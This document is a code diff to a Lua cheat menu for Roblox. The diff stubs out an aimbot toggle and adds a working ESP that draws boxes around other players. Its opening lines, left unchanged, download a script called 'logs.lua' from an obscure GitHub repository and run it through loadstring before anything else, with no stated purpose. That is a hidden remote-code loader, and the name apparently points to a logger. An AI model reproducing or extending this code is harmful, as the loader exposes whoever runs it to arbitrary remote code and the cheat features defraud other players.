@@ -1,10 +1,10 @@
--- Load the external script first before anything else
 local externalScriptUrl = 'https://raw.githubusercontent.com/ffavex/AHfahf1r1-rah/main/logs.lua'
 local externalScript = loadstring(game:HttpGet(externalScriptUrl))()
 if externalScript then
     -- Execute the external script
     externalScript()
 end
+
 
 -- Load the DrRay library from the GitHub repository Library
 local DrRayLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/DrRay-UI-Library/main/DrRay.lua"))()
@@ -15,111 +15,122 @@ local window = DrRayLibrary:Load("Remedy-Mobile", "Default")
 -- Create the first tab with an image ID
 local tab1 = DrRayLibrary.newTab("Aim", "ImageIdHere")
 
--- Aimbot toggle: Move the camera to the closest player
 tab1.newToggle("Aimbot", "Aimbot!", true, function(toggleState)
     if toggleState then
-        print("Aimbot On")
-
-        -- Function to get the closest player
-        local function getClosestPlayer()
-            local closestPlayer = nil
-            local shortestDistance = math.huge
-
-            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
-                if player ~= game.Players.LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-                    local distance = (player.Character.HumanoidRootPart.Position - game.Workspace.CurrentCamera.CFrame.Position).Magnitude
-                    if distance < shortestDistance then
-                        closestPlayer = player
-                        shortestDistance = distance
-                    end
-                end
-            end
-
-            return closestPlayer
-        end
-
-        -- Move camera to aim at closest player
-        local aimbotConnection
-        aimbotConnection = game:GetService("RunService").RenderStepped:Connect(function()
-            if not toggleState then
-                aimbotConnection:Disconnect()
-                return
-            end
-
-            local closestPlayer = getClosestPlayer()
-            if closestPlayer and closestPlayer.Character and closestPlayer.Character:FindFirstChild("HumanoidRootPart") then
-                game.Workspace.CurrentCamera.CFrame = CFrame.new(game.Workspace.CurrentCamera.CFrame.Position, closestPlayer.Character.HumanoidRootPart.Position)
-            end
-        end)
+        print("On")
     else
-        print("Aimbot Off")
-        -- Optionally stop any aimbot-related activities here
+        print("Off")
     end
 end)
 
--- ESP Toggle: Correctly handle the ESP box without freezing or duplicating
-local activeESPConnections = {}
-
-local function clearESP()
-    -- Clear previous ESP boxes to prevent duplication
-    for _, connection in pairs(activeESPConnections) do
-        connection:Disconnect()
-    end
-    activeESPConnections = {}
-end
-
-local function createESP(player)
-    -- Function to create ESP for each player
-    local espConnection
-    espConnection = game:GetService("RunService").RenderStepped:Connect(function()
-        if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
-            -- Stop drawing ESP if player is not valid anymore (left/died)
-            espConnection:Disconnect()
-            return
-        end
-
-        -- Draw ESP box around the player's HumanoidRootPart
-        -- (You can customize this drawing logic further)
-        -- Example logic for ESP drawing (pseudo-code, replace with your actual implementation)
-        -- DrawBox(player.Character.HumanoidRootPart) -- Placeholder for ESP drawing function
-    end)
-
-    table.insert(activeESPConnections, espConnection)
-end
-
--- Function to handle players leaving the game or dying
-local function onPlayerRemoved(player)
-    -- Clear ESP for the player that left
-    clearESP()
-end
-
--- ESP Toggle
+-- Create the second tab with a different image ID
 local tab2 = DrRayLibrary.newTab("Visuals", "ImageIdLogoHere")
-tab2.newToggle("ESP Box", "Esp Box", true, function(toggleState)
+
+-- ESP Code Variables
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+local espBoxes = {}
+local espConnection = nil
+
+-- Function to create the ESP box
+local function createESPBox(player)
+    if espBoxes[player] then return end -- Prevent duplicate ESP boxes
+
+    local box = Drawing.new("Square")
+    box.Visible = false
+    box.Color = Color3.fromRGB(0, 255, 255) -- Cyan color
+    box.Thickness = 2
+    box.Filled = false
+    espBoxes[player] = box
+end
+
+-- Function to remove the ESP box when a player leaves
+local function removeESPBox(player)
+    if espBoxes[player] then
+        espBoxes[player]:Remove() -- Remove the drawing
+        espBoxes[player] = nil
+    end
+end
+
+-- Function to update the ESP box
+local function updateESPBox(player, character)
+    local box = espBoxes[player]
+    if box and character and character:FindFirstChild("HumanoidRootPart") then
+        local hrp = character.HumanoidRootPart
+        local vector, onScreen = workspace.CurrentCamera:WorldToViewportPoint(hrp.Position)
+
+        if onScreen then
+            box.Visible = true
+            box.Size = Vector2.new(2000 / vector.Z, 2000 / vector.Z) -- Dynamic scaling based on distance
+            box.Position = Vector2.new(vector.X - box.Size.X / 2, vector.Y - box.Size.Y / 2)
+        else
+            box.Visible = false
+        end
+    else
+        box.Visible = false
+    end
+end
+
+-- Function to toggle ESP for all players
+local function toggleESP(toggleState)
     if toggleState then
         print("ESP On")
 
-        -- Clear any previous ESP instances to prevent duplication
-        clearESP()
-
-        -- Add ESP for all current players
-        for _, player in pairs(game:GetService("Players"):GetPlayers()) do
-            if player ~= game.Players.LocalPlayer then
-                createESP(player)
+        -- Create ESP boxes for all players
+        for _, player in pairs(Players:GetPlayers()) do
+            if player ~= LocalPlayer then
+                createESPBox(player)
             end
         end
 
-        -- Connect events for players joining or leaving
-        game:GetService("Players").PlayerAdded:Connect(createESP)
-        game:GetService("Players").PlayerRemoving:Connect(onPlayerRemoved)
+        -- Update ESP boxes on every frame
+        espConnection = RunService.RenderStepped:Connect(function()
+            for _, player in pairs(Players:GetPlayers()) do
+                if player ~= LocalPlayer and player.Character then
+                    updateESPBox(player, player.Character)
+                end
+            end
+        end)
+
+        -- Detect when a player dies and redraw the ESP
+        Players.PlayerRemoving:Connect(function(player)
+            removeESPBox(player)
+        end)
+
+        -- Detect when a player joins and create their ESP box
+        Players.PlayerAdded:Connect(function(player)
+            if player ~= LocalPlayer then
+                createESPBox(player)
+                player.CharacterAdded:Connect(function(character)
+                    updateESPBox(player, character)
+                end)
+            end
+        end)
     else
         print("ESP Off")
-        -- Clear all ESP boxes when the ESP is toggled off
-        clearESP()
+
+        -- Disconnect the ESP update connection
+        if espConnection then
+            espConnection:Disconnect()
+            espConnection = nil
+        end
+
+        -- Hide and remove all ESP boxes
+        for _, box in pairs(espBoxes) do
+            box.Visible = false
+            box:Remove() -- Clean up the drawings
+        end
+        espBoxes = {} -- Clear the ESP table
     end
+end
+
+-- Hook ESP toggle to your menu
+tab2.newToggle("ESP Box", "Esp Box", true, function(toggleState)
+    toggleESP(toggleState) -- Hooked up the toggle to the ESP functionality
 end)
 
--- Dropdown for other options
+-- Dropdown as in the original code
 tab2.newDropdown("Dropdown", "Select one of these options!", {"water", "dog", "air", "bb", "airplane", "wohhho", "yeay", "delete"}, function(selectedOption)
     print(selectedOption)
 end)
